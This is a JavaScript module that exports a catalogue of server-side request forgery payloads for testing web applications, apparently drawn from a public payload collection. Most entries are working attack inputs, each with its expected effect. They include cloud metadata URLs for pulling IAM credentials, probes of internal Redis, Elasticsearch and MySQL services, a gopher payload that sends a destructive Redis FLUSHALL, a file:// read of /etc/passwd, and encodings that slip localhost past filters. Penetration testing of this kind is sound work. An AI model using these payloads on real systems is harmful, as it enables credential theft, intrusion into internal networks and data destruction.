/**
 * SSRF (Server-Side Request Forgery) Payload Module
 * Reference: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery
 *
 * Categories: basic, advanced, filter_bypass, context_url
 */

const payloads = [
    // ── BASIC ──────────────────────────────────────────────────────────────────
    {
        type: "basic",
        payload: "http://127.0.0.1",
        description: "Localhost access via IPv4 loopback",
        expected_behavior: "Accesses services bound to localhost that are not publicly exposed"
    },
    {
        type: "basic",
        payload: "http://localhost",
        description: "Localhost access via hostname",
        expected_behavior: "Resolves to 127.0.0.1; accesses internal services"
    },
    {
        type: "basic",
        payload: "http://[::1]",
        description: "Localhost access via IPv6 loopback",
        expected_behavior: "IPv6 ::1 is equivalent to 127.0.0.1"
    },
    {
        type: "basic",
        payload: "http://169.254.169.254/latest/meta-data/",
        description: "AWS EC2 instance metadata endpoint",
        expected_behavior: "Returns EC2 metadata including IAM role credentials"
    },
    {
        type: "basic",
        payload: "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        description: "AWS IAM role credential extraction",
        expected_behavior: "Lists available IAM roles; append role name to get temp credentials"
    },
    {
        type: "basic",
        payload: "http://metadata.google.internal/computeMetadata/v1/",
        description: "GCP metadata endpoint",
        expected_behavior: "Returns GCP instance metadata (requires Metadata-Flavor: Google header)"
    },
    {
        type: "basic",
        payload: "http://169.254.169.254/metadata/v1/",
        description: "DigitalOcean metadata endpoint",
        expected_behavior: "Returns DO droplet metadata including private networking info"
    },
    {
        type: "basic",
        payload: "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
        description: "Azure instance metadata endpoint",
        expected_behavior: "Returns Azure VM metadata (requires Metadata: true header)"
    },
    {
        type: "basic",
        payload: "http://192.168.1.1",
        description: "Internal network gateway probe",
        expected_behavior: "Accesses internal network router/gateway admin panel"
    },
    {
        type: "basic",
        payload: "http://10.0.0.1",
        description: "Internal RFC 1918 network probe",
        expected_behavior: "Probes internal 10.x.x.x address range"
    },

    // ── ADVANCED ───────────────────────────────────────────────────────────────
    {
        type: "advanced",
        payload: "http://127.0.0.1:6379/",
        description: "Internal Redis access via SSRF",
        expected_behavior: "Accesses Redis on default port; can lead to RCE via Redis commands"
    },
    {
        type: "advanced",
        payload: "http://127.0.0.1:9200/_cluster/health",
        description: "Internal Elasticsearch access",
        expected_behavior: "Accesses Elasticsearch API for cluster info and data extraction"
    },
    {
        type: "advanced",
        payload: "http://127.0.0.1:3306",
        description: "Internal MySQL port probe",
        expected_behavior: "Probes MySQL; response reveals MySQL version banner"
    },
    {
        type: "advanced",
        payload: "gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a",
        description: "Gopher protocol — Redis command execution",
        expected_behavior: "Sends raw Redis FLUSHALL command via gopher protocol"
    },
    {
        type: "advanced",
        payload: "file:///etc/passwd",
        description: "Local file read via file:// protocol",
        expected_behavior: "Reads local files using file:// URI scheme"
    },
    {
        type: "advanced",
        payload: "dict://127.0.0.1:6379/INFO",
        description: "Dict protocol — Redis INFO command",
        expected_behavior: "Sends INFO command to Redis via dict:// protocol"
    },

    // ── FILTER BYPASS ──────────────────────────────────────────────────────────
    {
        type: "filter_bypass",
        payload: "http://0x7f000001",
        description: "Hex IP representation of 127.0.0.1",
        expected_behavior: "0x7f000001 resolves to 127.0.0.1, bypassing string matching"
    },
    {
        type: "filter_bypass",
        payload: "http://2130706433",
        description: "Decimal IP representation of 127.0.0.1",
        expected_behavior: "Decimal integer (127*2^24 + 0*2^16 + 0*2^8 + 1) resolves to 127.0.0.1"
    },
    {
        type: "filter_bypass",
        payload: "http://0177.0.0.1",
        description: "Octal IP representation of 127.0.0.1",
        expected_behavior: "0177 octal = 127 decimal; bypasses blocklist"
    },
    {
        type: "filter_bypass",
        payload: "http://127.1",
        description: "Shortened IP notation for 127.0.0.1",
        expected_behavior: "127.1 expands to 127.0.0.1 on most systems"
    },
    {
        type: "filter_bypass",
        payload: "http://spoofed.burpcollaborator.net",
        description: "DNS rebinding via controlled domain",
        expected_behavior: "First DNS query returns allowed IP, second returns 127.0.0.1"
    },
    {
        type: "filter_bypass",
        payload: "http://localtest.me",
        description: "DNS wildcard domain resolving to 127.0.0.1",
        expected_behavior: "localtest.me always resolves to 127.0.0.1 via DNS"
    },
    {
        type: "filter_bypass",
        payload: "http://①⑥⑨。②⑤④。①⑥⑨。②⑤④",
        description: "Unicode enclosed numeral IP representation",
        expected_behavior: "Some parsers normalize Unicode numerals to ASCII"
    },
    {
        type: "filter_bypass",
        payload: "http://0.0.0.0",
        description: "Wildcard IP address (0.0.0.0)",
        expected_behavior: "0.0.0.0 may route to localhost on some OS configurations"
    },

    // ── CONTEXT: URL ───────────────────────────────────────────────────────────
    {
        type: "context_url",
        payload: "?url=http://127.0.0.1:8080/admin",
        description: "SSRF via URL parameter targeting internal admin panel",
        expected_behavior: "Server fetches internal admin panel on behalf of attacker"
    },
    {
        type: "context_url",
        payload: "?image=http://169.254.169.254/latest/meta-data/",
        description: "SSRF via image URL parameter targeting AWS metadata",
        expected_behavior: "Image fetching functionality reads cloud metadata"
    },
    {
        type: "context_url",
        payload: "?webhook=http://127.0.0.1:6379/",
        description: "SSRF via webhook URL to internal Redis",
        expected_behavior: "Webhook functionality connects to internal Redis service"
    },
];

module.exports = {
    vulnerability: "ssrf",
    name: "Server-Side Request Forgery (SSRF)",
    description: "Payloads for testing SSRF vulnerabilities including cloud metadata access, internal service probing, protocol smuggling, and IP representation bypasses",
    payloads,
};
